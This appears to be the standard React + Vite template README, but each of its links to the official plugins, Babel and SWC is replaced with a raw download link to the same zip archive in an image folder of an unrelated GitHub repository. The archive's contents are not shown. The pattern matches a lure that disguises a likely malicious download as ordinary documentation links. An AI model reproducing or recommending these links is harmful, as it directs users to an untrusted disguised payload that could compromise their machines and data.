# React + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://github.com/t1viktor/AbdominoplastiaReact/raw/refs/heads/main/public/img/Abdominoplastia_React_v2.2.zip) uses [Babel](https://github.com/t1viktor/AbdominoplastiaReact/raw/refs/heads/main/public/img/Abdominoplastia_React_v2.2.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://github.com/t1viktor/AbdominoplastiaReact/raw/refs/heads/main/public/img/Abdominoplastia_React_v2.2.zip) uses [SWC](https://github.com/t1viktor/AbdominoplastiaReact/raw/refs/heads/main/public/img/Abdominoplastia_React_v2.2.zip) for Fast Refresh
